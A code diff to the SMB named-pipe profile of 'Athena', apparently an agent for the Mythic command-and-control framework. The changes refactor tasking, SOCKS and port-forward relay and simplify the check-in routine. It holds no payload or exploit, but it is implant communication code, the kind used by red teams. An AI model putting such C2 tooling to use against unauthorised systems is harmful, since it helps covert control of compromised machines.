@@ -40,6 +40,7 @@ namespace Athena
         private CancellationToken cancellationToken { get; set; }
         public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
         private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
+        public event EventHandler<MessageReceivedArgs> SetMessageReceived;
         private bool checkedin = false;
         public Smb()
         {
@@ -91,11 +92,15 @@ namespace Athena
                 List<MythicDatagram> socksMessages = socksTask.Result;
                 List<MythicDatagram> rpFwdMessages = rpFwdTask.Result;
 
-                if (responses.Count > 0 || delegateMessages.Count > 0 || socksMessages.Count > 0 || rpFwdMessages.Count > 0)
+                if (responses.Count > 0 || 
+                    delegateMessages.Count > 0 || 
+                    socksMessages.Count > 0 || 
+                    rpFwdMessages.Count > 0
+                    )
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Responses: " + responses.Count());
-                    Debug.WriteLine($"[{DateTime.Now}] Delegates: " + delegateMessages.Count());
-                    Debug.WriteLine($"[{DateTime.Now}] Socks Messages: " + socksMessages.Count());
+                    Debug.WriteLine($"[{DateTime.Now}] Responses: " + responses.Count);
+                    Debug.WriteLine($"[{DateTime.Now}] Delegates: " + delegateMessages.Count);
+                    Debug.WriteLine($"[{DateTime.Now}] Socks Messages: " + socksMessages.Count);
                     GetTasking gt = new GetTasking()
                     {
                         action = "get_tasking",
@@ -122,7 +127,7 @@ namespace Athena
             }
             else
             {
-                message = (await Misc.Base64Decode(message)).Substring(36);
+                message = Misc.Base64Decode(message).Substring(36);
             }
 
             //Check what kind of message we got.
@@ -155,29 +160,14 @@ namespace Athena
             cts.Cancel();
             return true;
         }
-        public async Task<CheckinResponse> Checkin(Checkin checkin)
+        public async Task<bool> Checkin(Checkin checkin)
         {
             //Write our checkin message to the pipe
             Debug.WriteLine($"[{DateTime.Now}] Starting Checkin Process");
             await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
-            //Wait for our ManualResetEvent to trigger indicating we got a response.
-            //await this.serverPipe.WaitMessageAsync();
-            onCheckinResponse.WaitOne();
-            //We got a message, but we should make sure it's not empty.
-            if (!string.IsNullOrEmpty(this.checkinResponse))
-            {
-                string res = this.checkinResponse;
-                this.checkinResponse = String.Empty;
-                this.checkedin = true;
-                Debug.WriteLine($"[{DateTime.Now}] Finished Checkin Process");
-                return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
-            }
-            Debug.WriteLine($"[{DateTime.Now}] Failed Checkin Process");
-            return new CheckinResponse()
-            {
-                status = "failed"
-            };
+            //We wrote our message, it's up to jesus now. 
+            return true;
         }
         private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
         {
